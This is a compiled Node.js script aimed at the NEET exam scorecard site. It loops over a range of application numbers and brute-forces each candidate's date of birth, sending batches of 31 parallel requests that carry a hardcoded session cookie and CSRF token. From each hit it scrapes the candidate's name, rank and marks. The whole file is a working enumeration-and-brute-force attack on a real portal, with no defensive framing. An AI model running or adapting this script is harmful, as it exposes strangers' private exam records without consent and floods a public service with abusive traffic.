"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const qs_1 = __importDefault(require("qs"));
const cheerio_1 = __importDefault(require("cheerio"));
function solve(applicationNumber, day, month, year) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = qs_1.default.stringify({
            '_csrf-frontend': '6HnBB0m6vRN91DNSlpdF0uaDtPpU4EtuA2QaNKwvpgXeM6RkGduFRjnsBibd2xTlidXrkhrTICBnPWJ5gVzCdg==',
            'Scorecardmodel[ApplicationNumber]': applicationNumber,
            'Scorecardmodel[Day]': day,
            'Scorecardmodel[Month]': month,
            'Scorecardmodel[Year]': year
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'advanced-frontend=g910j2ob1p5k0rthvh1b55q2q9; _csrf-frontend=8d92dad480665d1175121e573a8ea3c0e454e4237aeae38087effc86b9be4b77a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%226JecPa8UD85tKLQ7oV_hN3kNdYxM-sds%22%3B%7D',
                'Origin': 'null',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"'
            },
            data: data
        };
        try {
            const response = yield axios_1.default.request(config);
            const parsedData = parseHtml(JSON.stringify(response.data));
            return parsedData;
        }
        catch (error) {
            return null;
        }
    });
}
function parseHtml(htmlContent) {
    const $ = cheerio_1.default.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next('td').text().trim() || 'N/A';
    const candidateName = $('td:contains("Candidate’s Name")').next().text().trim() || 'N/A';
    // Find the All India Rank
    const allIndiaRank = $('td:contains("NEET All India Rank")').next('td').text().trim() || 'N/A';
    const marks = $('td:contains("Total Marks Obtained (out of 720)")').first().next('td').text().trim() || 'N/A';
    // console.log(`Application Number: ${applicationNumber}`);
    // console.log(`Candidate's Name: ${candidateName}`);
    // console.log(`All India Rank: ${allIndiaRank}`); 
    // console.log(`Marks: ${marks}`);
    // console.log({
    //     applicationNumber,
    //     candidateName,
    //     allIndiaRank,
    //     marks
    // });
    if (allIndiaRank === 'N/A') {
        return null;
    }
    return {
        applicationNumber,
        candidateName,
        allIndiaRank,
        marks
    };
}
function main(rollNumber) {
    return __awaiter(this, void 0, void 0, function* () {
        let solved = false;
        for (let year = 2007; year >= 2004; year--) {
            if (solved) {
                break;
            }
            for (let month = 1; month <= 12; month++) {
                if (solved) {
                    break;
                }
                const dataPromises = [];
                //2007 , jan
                console.log("sending req for month" + month + " of the year" + year);
                for (let day = 1; day <= 31; day++) {
                    //console.log(`processing ${rollNumber} for ${year}-${month}-${day}`);
                    const dataPromise = solve(rollNumber, day.toString(), month.toString(), year.toString());
                    dataPromises.push(dataPromise);
                }
                const resolvedData = yield Promise.all(dataPromises);
                resolvedData.forEach(data => {
                    if (data) {
                        console.log(data);
                        solved = true;
                    }
                });
                /// wait for 31 reqqq
            }
        }
    });
}
// solve("240411183517" , "08" , "03" , "2007");
// main("240411183516");
//240411345673
function solveAllApplications() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 240411345673; i < 240411345699; i++) {
            yield main(i.toString());
        }
    });
}
solveAllApplications();
